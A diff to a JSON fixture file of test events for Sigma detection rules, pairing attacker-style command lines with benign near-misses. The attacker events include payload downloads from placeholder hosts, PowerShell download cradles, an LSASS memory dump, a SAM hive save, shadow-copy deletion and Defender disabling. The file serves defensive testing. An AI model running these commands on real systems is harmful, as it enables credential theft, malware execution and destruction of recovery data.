@@ -1,176 +1,387 @@
 {
-  "_comment": "WS2.1 detection fixtures. Per rule: one true_positive event that MUST fire, and true_negatives (benign / near-miss) that MUST NOT — the false-positive regression. Keyed by rule filename. Events use Sigma field names (Image/CommandLine) so they test the rule LOGIC independent of the ECS field mapping.",
-
+  "_comment": "WS2.1 detection fixtures. Per rule: one true_positive event that MUST fire, and true_negatives (benign / near-miss) that MUST NOT \u2014 the false-positive regression. Keyed by rule filename. Events use Sigma field names (Image/CommandLine) so they test the rule LOGIC independent of the ECS field mapping.",
   "proc_creation_win_bitsadmin_download.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /transfer job http://evil.example/x.exe C:\\x.exe"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "CommandLine": "bitsadmin /transfer job http://evil.example/x.exe C:\\x.exe"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\bitsadmin.exe", "CommandLine": "bitsadmin /list /allusers"},
-      {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache /transfer http://x/y"}
+      {
+        "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+        "CommandLine": "bitsadmin /list /allusers"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -urlcache /transfer http://x/y"
+      }
     ]
   },
   "proc_creation_win_clear_event_logs.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil cl Security"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\wevtutil.exe",
+      "CommandLine": "wevtutil cl Security"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\wevtutil.exe", "CommandLine": "wevtutil qe Security /c:10"},
-      {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c echo clear-log"}
+      {
+        "Image": "C:\\Windows\\System32\\wevtutil.exe",
+        "CommandLine": "wevtutil qe Security /c:10"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd /c echo clear-log"
+      }
     ]
   },
   "proc_creation_win_local_acct_create.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user backdoor P@ssw0rd /add"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "CommandLine": "net user backdoor P@ssw0rd /add"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user administrator"},
-      {"Image": "C:\\Windows\\System32\\net1.exe", "CommandLine": "net1 localgroup administrators"}
+      {
+        "Image": "C:\\Windows\\System32\\net.exe",
+        "CommandLine": "net user administrator"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\net1.exe",
+        "CommandLine": "net1 localgroup administrators"
+      }
     ]
   },
   "proc_creation_win_lsass_dump.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\lsass.dmp full"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\lsass.dmp full"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"},
-      {"Image": "C:\\Windows\\System32\\rundll32.exe", "CommandLine": "rundll32.exe comsvcs.dll, NoSuchExport"}
+      {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe comsvcs.dll, NoSuchExport"
+      }
     ]
   },
   "proc_creation_win_powershell_encoded.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc ZQBjAGgAbwAgAGgAaQA="},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -nop -w hidden -enc ZQBjAGgAbwAgAGgAaQA="
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -File C:\\admin\\backup.ps1"},
-      {"Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh -Command Get-Process"}
+      {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -File C:\\admin\\backup.ps1"
+      },
+      {
+        "Image": "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+        "CommandLine": "pwsh -Command Get-Process"
+      }
     ]
   },
   "proc_creation_win_rdp_hijack_tscon.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\tscon.exe", "CommandLine": "tscon.exe 1 /dest:rdp-tcp#5"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\tscon.exe",
+      "CommandLine": "tscon.exe 1 /dest:rdp-tcp#5"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\tscon.exe", "CommandLine": "tscon.exe /?"},
-      {"Image": "C:\\Windows\\System32\\mstsc.exe", "CommandLine": "mstsc.exe /dest:foo"}
+      {
+        "Image": "C:\\Windows\\System32\\tscon.exe",
+        "CommandLine": "tscon.exe /?"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\mstsc.exe",
+        "CommandLine": "mstsc.exe /dest:foo"
+      }
     ]
   },
   "proc_creation_win_regsvr32_remote_sct.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /s /n /u /i:http://evil.example/x.sct scrobj.dll"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\regsvr32.exe",
+      "CommandLine": "regsvr32.exe /s /n /u /i:http://evil.example/x.sct scrobj.dll"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /s C:\\app\\mylib.dll"},
-      {"Image": "C:\\Windows\\System32\\regsvr32.exe", "CommandLine": "regsvr32.exe /i:C:\\local\\x.inf setupapi.dll"}
+      {
+        "Image": "C:\\Windows\\System32\\regsvr32.exe",
+        "CommandLine": "regsvr32.exe /s C:\\app\\mylib.dll"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\regsvr32.exe",
+        "CommandLine": "regsvr32.exe /i:C:\\local\\x.inf setupapi.dll"
+      }
     ]
   },
   "proc_creation_win_scheduled_task.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /tn EvilTask /tr C:\\m.exe /sc onlogon"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\schtasks.exe",
+      "CommandLine": "schtasks /create /tn EvilTask /tr C:\\m.exe /sc onlogon"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /query /fo LIST"},
-      {"Image": "C:\\Windows\\System32\\schtasks.exe", "CommandLine": "schtasks /create /xml task.xml"}
+      {
+        "Image": "C:\\Windows\\System32\\schtasks.exe",
+        "CommandLine": "schtasks /query /fo LIST"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\schtasks.exe",
+        "CommandLine": "schtasks /create /xml task.xml"
+      }
     ]
   },
   "proc_creation_win_user_discovery.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /all"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\whoami.exe",
+      "CommandLine": "whoami /all"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami"},
-      {"Image": "C:\\Windows\\System32\\whoami.exe", "CommandLine": "whoami /user"}
+      {
+        "Image": "C:\\Windows\\System32\\whoami.exe",
+        "CommandLine": "whoami"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\whoami.exe",
+        "CommandLine": "whoami /user"
+      }
     ]
   },
   "proc_creation_win_wmi_process_create.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic process call create \"calc.exe\""},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+      "CommandLine": "wmic process call create \"calc.exe\""
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic process list brief"},
-      {"Image": "C:\\Windows\\System32\\wbem\\wmic.exe", "CommandLine": "wmic os get caption"}
+      {
+        "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+        "CommandLine": "wmic process list brief"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+        "CommandLine": "wmic os get caption"
+      }
     ]
   },
   "proc_creation_win_mshta_remote.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe http://evil.example/payload.hta"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\mshta.exe",
+      "CommandLine": "mshta.exe http://evil.example/payload.hta"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\mshta.exe", "CommandLine": "mshta.exe C:\\local\\dialog.hta"},
-      {"Image": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd /c echo http"}
+      {
+        "Image": "C:\\Windows\\System32\\mshta.exe",
+        "CommandLine": "mshta.exe C:\\local\\dialog.hta"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "CommandLine": "cmd /c echo http"
+      }
     ]
   },
   "proc_creation_win_run_key_persistence.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\m.exe"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\reg.exe",
+      "CommandLine": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\m.exe"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
-      {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg add HKCU\\Software\\MyApp\\Settings /v theme /d dark"}
+      {
+        "Image": "C:\\Windows\\System32\\reg.exe",
+        "CommandLine": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\reg.exe",
+        "CommandLine": "reg add HKCU\\Software\\MyApp\\Settings /v theme /d dark"
+      }
     ]
   },
   "proc_creation_win_service_creation_sc.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc create EvilSvc binPath= C:\\m.exe start= auto"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\sc.exe",
+      "CommandLine": "sc create EvilSvc binPath= C:\\m.exe start= auto"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc query Spooler"},
-      {"Image": "C:\\Windows\\System32\\sc.exe", "CommandLine": "sc qc Dnscache"}
+      {
+        "Image": "C:\\Windows\\System32\\sc.exe",
+        "CommandLine": "sc query Spooler"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\sc.exe",
+        "CommandLine": "sc qc Dnscache"
+      }
     ]
   },
   "proc_creation_win_vss_delete_shadows.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin delete shadows /all /quiet"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\vssadmin.exe",
+      "CommandLine": "vssadmin delete shadows /all /quiet"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin list shadows"},
-      {"Image": "C:\\Windows\\System32\\vssadmin.exe", "CommandLine": "vssadmin resize shadowstorage /maxsize=10GB"}
+      {
+        "Image": "C:\\Windows\\System32\\vssadmin.exe",
+        "CommandLine": "vssadmin list shadows"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\vssadmin.exe",
+        "CommandLine": "vssadmin resize shadowstorage /maxsize=10GB"
+      }
     ]
   },
   "proc_creation_win_defender_tamper.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Set-MpPreference -DisableRealtimeMonitoring $true"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell Set-MpPreference -DisableRealtimeMonitoring $true"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Get-MpPreference"},
-      {"Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell Set-MpPreference -ExclusionPath C:\\temp"}
+      {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell Get-MpPreference"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell Set-MpPreference -ExclusionPath C:\\temp"
+      }
     ]
   },
   "proc_creation_win_certutil_decode.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -decode C:\\enc.txt C:\\out.exe"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil -decode C:\\enc.txt C:\\out.exe"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -hashfile C:\\x.exe SHA256"},
-      {"Image": "C:\\Windows\\System32\\certutil.exe", "CommandLine": "certutil -urlcache /transfer http://x/y"}
+      {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -hashfile C:\\x.exe SHA256"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -urlcache /transfer http://x/y"
+      }
     ]
   },
   "proc_creation_win_reg_save_sam.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg save HKLM\\SAM C:\\sam.hive"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\reg.exe",
+      "CommandLine": "reg save HKLM\\SAM C:\\sam.hive"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg query HKLM\\SAM"},
-      {"Image": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg save HKLM\\Software\\MyApp C:\\app.hive"}
+      {
+        "Image": "C:\\Windows\\System32\\reg.exe",
+        "CommandLine": "reg query HKLM\\SAM"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\reg.exe",
+        "CommandLine": "reg save HKLM\\Software\\MyApp C:\\app.hive"
+      }
     ]
   },
   "proc_creation_win_nltest_discovery.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\nltest.exe", "CommandLine": "nltest /dclist:corp.local"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\nltest.exe",
+      "CommandLine": "nltest /dclist:corp.local"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\nltest.exe", "CommandLine": "nltest /query"},
-      {"Image": "C:\\Windows\\System32\\nltest.exe", "CommandLine": "nltest /sc_verify:corp.local"}
+      {
+        "Image": "C:\\Windows\\System32\\nltest.exe",
+        "CommandLine": "nltest /query"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\nltest.exe",
+        "CommandLine": "nltest /sc_verify:corp.local"
+      }
     ]
   },
   "proc_creation_win_domain_group_discovery.yml": {
-    "true_positive": {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net group \"Domain Admins\" /domain"},
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\net.exe",
+      "CommandLine": "net group \"Domain Admins\" /domain"
+    },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net group"},
-      {"Image": "C:\\Windows\\System32\\net.exe", "CommandLine": "net user administrator"}
+      {
+        "Image": "C:\\Windows\\System32\\net.exe",
+        "CommandLine": "net group"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\net.exe",
+        "CommandLine": "net user administrator"
+      }
     ]
   },
   "net_zeek_port_scan.yml": {
-    "true_positive": {"note": "Scan::Port_Scan"},
+    "true_positive": {
+      "note": "Scan::Port_Scan"
+    },
     "true_negatives": [
-      {"note": "SSH::Watched_Country_Login"},
-      {"note": "Scan::Port_Scan_Allowed"}
+      {
+        "note": "SSH::Watched_Country_Login"
+      },
+      {
+        "note": "Scan::Port_Scan_Allowed"
+      }
     ]
   },
   "net_zeek_ssh_bruteforce.yml": {
-    "true_positive": {"note": "SSH::Password_Guessing"},
+    "true_positive": {
+      "note": "SSH::Password_Guessing"
+    },
     "true_negatives": [
-      {"note": "SSH::Watched_Country_Login"},
-      {"note": "Scan::Port_Scan"}
+      {
+        "note": "SSH::Watched_Country_Login"
+      },
+      {
+        "note": "Scan::Port_Scan"
+      }
     ]
   },
   "net_zeek_executable_download.yml": {
-    "true_positive": {"source": "HTTP", "mime_type": "application/x-dosexec"},
+    "true_positive": {
+      "source": "HTTP",
+      "mime_type": "application/x-dosexec"
+    },
     "true_negatives": [
-      {"source": "HTTP", "mime_type": "text/html"},
-      {"source": "FTP_DATA", "mime_type": "application/x-dosexec"}
+      {
+        "source": "HTTP",
+        "mime_type": "text/html"
+      },
+      {
+        "source": "FTP_DATA",
+        "mime_type": "application/x-dosexec"
+      }
     ]
   },
   "auth_win_bruteforce_failed_logons.yml": {
-    "true_positive": {"EventID": 4625, "TargetUserName": "jsmith"},
+    "true_positive": {
+      "EventID": 4625,
+      "TargetUserName": "jsmith"
+    },
     "true_negatives": [
-      {"EventID": 4624, "TargetUserName": "jsmith"}
+      {
+        "EventID": 4624,
+        "TargetUserName": "jsmith"
+      }
     ]
   },
   "auth_win_bruteforce_source_spray.yml": {
-    "true_positive": {"EventID": 4625, "TargetUserName": "jsmith", "IpAddress": "203.0.113.42"},
+    "true_positive": {
+      "EventID": 4625,
+      "TargetUserName": "jsmith",
+      "IpAddress": "203.0.113.42"
+    },
     "true_negatives": [
-      {"EventID": 4624, "TargetUserName": "jsmith", "IpAddress": "203.0.113.42"}
+      {
+        "EventID": 4624,
+        "TargetUserName": "jsmith",
+        "IpAddress": "203.0.113.42"
+      }
     ]
   },
   "auth_win_explicit_cred_account_sweep.yml": {
-    "true_positive": {"EventID": 4648, "TargetUserName": "svc_backup"},
+    "true_positive": {
+      "EventID": 4648,
+      "TargetUserName": "svc_backup"
+    },
     "true_negatives": [
-      {"EventID": 4624, "TargetUserName": "svc_backup"}
+      {
+        "EventID": 4624,
+        "TargetUserName": "svc_backup"
+      }
     ]
   },
   "auth_win_sedebug_special_logon.yml": {
@@ -180,7 +391,11 @@
       "SubjectUserSid": "S-1-5-21-111-222-333-1001"
     },
     "true_negatives": [
-      {"EventID": 4672, "PrivilegeList": "SeDebugPrivilege", "SubjectUserSid": "S-1-5-18"},
+      {
+        "EventID": 4672,
+        "PrivilegeList": "SeDebugPrivilege",
+        "SubjectUserSid": "S-1-5-18"
+      },
       {
         "EventID": 4672,
         "PrivilegeList": "SeBackupPrivilege SeRestorePrivilege",
@@ -189,28 +404,49 @@
     ]
   },
   "auth_win_security_log_cleared.yml": {
-    "true_positive": {"EventID": 1102},
+    "true_positive": {
+      "EventID": 1102
+    },
     "true_negatives": [
-      {"EventID": 4624}
+      {
+        "EventID": 4624
+      }
     ]
   },
   "system_win_eventlog_cleared.yml": {
-    "true_positive": {"EventID": 104},
+    "true_positive": {
+      "EventID": 104
+    },
     "true_negatives": [
-      {"EventID": 6005}
+      {
+        "EventID": 6005
+      }
     ]
   },
   "system_win_service_installed.yml": {
-    "true_positive": {"EventID": 7045},
+    "true_positive": {
+      "EventID": 7045
+    },
     "true_negatives": [
-      {"EventID": 7040}
+      {
+        "EventID": 7040
+      }
     ]
   },
   "system_win_eventlog_service_tamper.yml": {
-    "true_positive": {"EventID": 7040, "param1": "Windows Event Log"},
+    "true_positive": {
+      "EventID": 7040,
+      "param1": "Windows Event Log"
+    },
     "true_negatives": [
-      {"EventID": 7040, "param1": "Print Spooler"},
-      {"EventID": 7045, "param1": "Windows Event Log"}
+      {
+        "EventID": 7040,
+        "param1": "Print Spooler"
+      },
+      {
+        "EventID": 7045,
+        "param1": "Windows Event Log"
+      }
     ]
   },
   "auth_win_priv_group_membership_change.yml": {
@@ -221,8 +457,16 @@
       "TargetSid": "S-1-5-32-544"
     },
     "true_negatives": [
-      {"EventID": 4732, "TargetUserName": "Remote Desktop Users", "TargetSid": "S-1-5-32-555"},
-      {"EventID": 4720, "TargetUserName": "Administrators", "TargetSid": "S-1-5-32-544"}
+      {
+        "EventID": 4732,
+        "TargetUserName": "Remote Desktop Users",
+        "TargetSid": "S-1-5-32-555"
+      },
+      {
+        "EventID": 4720,
+        "TargetUserName": "Administrators",
+        "TargetSid": "S-1-5-32-544"
+      }
     ]
   },
   "wmi_win_event_subscription_binding.yml": {
@@ -231,8 +475,14 @@
       "Operation": "IWbemServices::PutInstance - __FilterToConsumerBinding"
     },
     "true_negatives": [
-      {"EventID": 5861, "Operation": "IWbemServices::PutInstance - __EventFilter"},
-      {"EventID": 5859, "Operation": "IWbemServices::PutInstance - __FilterToConsumerBinding"}
+      {
+        "EventID": 5861,
+        "Operation": "IWbemServices::PutInstance - __EventFilter"
+      },
+      {
+        "EventID": 5859,
+        "Operation": "IWbemServices::PutInstance - __FilterToConsumerBinding"
+      }
     ]
   },
   "create_remote_thread_win_susp_target.yml": {
@@ -260,7 +510,10 @@
       "ParentImage": "C:\\Windows\\PSEXESVC.exe"
     },
     "true_negatives": [
-      {"Image": "C:\\Windows\\System32\\cmd.exe", "ParentImage": "C:\\Windows\\explorer.exe"},
+      {
+        "Image": "C:\\Windows\\System32\\cmd.exe",
+        "ParentImage": "C:\\Windows\\explorer.exe"
+      },
       {
         "Image": "C:\\Windows\\System32\\notepad.exe",
         "ParentImage": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe"
@@ -273,10 +526,176 @@
       "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
     },
     "true_negatives": [
-      {"EventID": 4104, "ScriptBlockText": "Get-Process | Where-Object {$_.CPU -gt 10}"},
+      {
+        "EventID": 4104,
+        "ScriptBlockText": "Get-Process | Where-Object {$_.CPU -gt 10}"
+      },
       {
         "EventID": 4103,
         "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://evil/a.ps1')"
+      }
+    ]
+  },
+  "proc_creation_win_certutil_urlcache_download.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\certutil.exe",
+      "CommandLine": "certutil.exe -urlcache -split -f http://198.51.100.7/payload.exe out.exe"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -urlcache -f http://pki.corp.local/ca.crt"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\certutil.exe",
+        "CommandLine": "certutil -hashfile C:\\x.exe SHA256"
+      }
+    ]
+  },
+  "proc_creation_win_powershell_downloadstring.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "CommandLine": "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/s.ps1')"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe Get-Process | Sort-Object CPU -Descending"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "CommandLine": "powershell.exe -File C:\\scripts\\backup.ps1"
+      }
+    ]
+  },
+  "proc_creation_win_cscript_wscript_remote.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\wscript.exe",
+      "CommandLine": "wscript.exe //e:jscript C:\\Users\\Public\\drop.txt"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\cscript.exe",
+        "CommandLine": "cscript.exe C:\\scripts\\inventory.vbs"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\wscript.exe",
+        "CommandLine": "wscript.exe C:\\ProgramData\\logon.vbs"
+      }
+    ]
+  },
+  "proc_creation_win_rundll32_inline_script.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\rundll32.exe",
+      "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\rundll32.exe",
+        "CommandLine": "rundll32.exe printui.dll,PrintUIEntry /q"
+      }
+    ]
+  },
+  "proc_creation_win_cmstp_execution.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\cmstp.exe",
+      "CommandLine": "cmstp.exe /ni /s C:\\Users\\Public\\malicious.inf"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\cmstp.exe",
+        "CommandLine": "cmstp.exe /u"
+      },
+      {
+        "Image": "C:\\Windows\\explorer.exe",
+        "CommandLine": "C:\\Windows\\explorer.exe"
+      }
+    ]
+  },
+  "proc_creation_win_installutil_bypass.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\installutil.exe",
+      "CommandLine": "installutil.exe /U payload.dll"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\installutil.exe",
+        "CommandLine": "installutil.exe MyService.exe"
+      },
+      {
+        "Image": "C:\\Windows\\explorer.exe",
+        "CommandLine": "C:\\Windows\\explorer.exe"
+      }
+    ]
+  },
+  "proc_creation_win_regasm_regsvcs_bypass.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe",
+      "CommandLine": "regasm.exe /U C:\\Users\\victim\\AppData\\Local\\Temp\\payload.dll"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe",
+        "CommandLine": "regasm.exe C:\\Program Files\\Vendor\\Interop.dll"
+      },
+      {
+        "Image": "C:\\Windows\\explorer.exe",
+        "CommandLine": "C:\\Windows\\explorer.exe"
+      }
+    ]
+  },
+  "proc_creation_win_msiexec_remote.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\msiexec.exe",
+      "CommandLine": "msiexec.exe /i http://198.51.100.7/payload.msi /qn"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\msiexec.exe",
+        "CommandLine": "msiexec.exe /i C:\\Installers\\app.msi /qn"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\msiexec.exe",
+        "CommandLine": "msiexec.exe /i \\\\deploy\\pkg\\agent.msi SERVERURL=https://intranet.corp/enroll /qn"
+      }
+    ]
+  },
+  "proc_creation_win_forfiles_execution.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\forfiles.exe",
+      "CommandLine": "forfiles.exe /p C:\\Windows\\System32 /m notepad.exe /c 'cmd /c calc.exe'"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\forfiles.exe",
+        "CommandLine": "forfiles.exe /p C:\\Logs /s /m *.log /d -30"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\forfiles.exe",
+        "CommandLine": "forfiles.exe /p C:\\Logs /s /m *.log /d -30 /c 'del @path'"
+      }
+    ]
+  },
+  "proc_creation_win_pcalua_execution.yml": {
+    "true_positive": {
+      "Image": "C:\\Windows\\System32\\pcalua.exe",
+      "CommandLine": "pcalua.exe -a C:\\Users\\Public\\payload.exe",
+      "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+    },
+    "true_negatives": [
+      {
+        "Image": "C:\\Windows\\System32\\pcalua.exe",
+        "CommandLine": "pcalua.exe -a C:\\Program Files\\Legacy\\setup.exe",
+        "ParentImage": "C:\\Windows\\explorer.exe"
+      },
+      {
+        "Image": "C:\\Windows\\System32\\notepad.exe",
+        "CommandLine": "notepad.exe C:\\notes.txt",
+        "ParentImage": "C:\\Windows\\explorer.exe"
       }
     ]
   }
